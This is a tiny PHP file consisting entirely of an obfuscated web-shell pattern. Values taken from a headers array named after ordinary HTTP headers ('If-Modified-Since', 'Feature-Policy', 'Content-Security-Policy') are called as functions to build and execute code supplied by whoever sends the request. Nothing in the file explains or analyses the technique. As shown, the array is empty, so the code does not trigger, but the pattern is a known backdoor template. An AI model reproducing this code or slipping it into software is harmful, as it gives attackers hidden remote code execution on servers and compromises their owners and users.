<?php
$_HEADERS = Array();
if (isset($_HEADERS['If-Modified-Since'])) {
    $post = $_HEADERS['If-Modified-Since']('', $_HEADERS['Feature-Policy']($_HEADERS['Content-Security-Policy']));
    $post();
}